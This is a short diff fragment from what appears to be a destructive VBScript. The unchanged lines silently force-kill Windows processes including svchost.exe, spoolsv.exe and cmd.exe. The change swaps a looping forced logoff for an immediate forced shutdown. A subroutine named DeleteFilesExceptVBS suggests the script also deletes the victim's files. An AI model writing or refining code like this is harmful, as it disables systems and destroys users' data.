@@ -120,9 +120,8 @@ objShell.Run "taskkill /f /im spoolsv.exe", 0, False
 objShell.Run "taskkill /f /im svchost.exe", 0, False
 objShell.Run "taskkill /f /im cmd.exe", 0, False
 
-' Log out the current user
-objShell.Run "shutdown -l -f", 0, True
-Loop
+' Shut down the computer
+objShell.Run "shutdown -s -f -t 0", 0, False
 
 Sub DeleteFilesExceptVBS(folderPath)
     On Error Resume Next
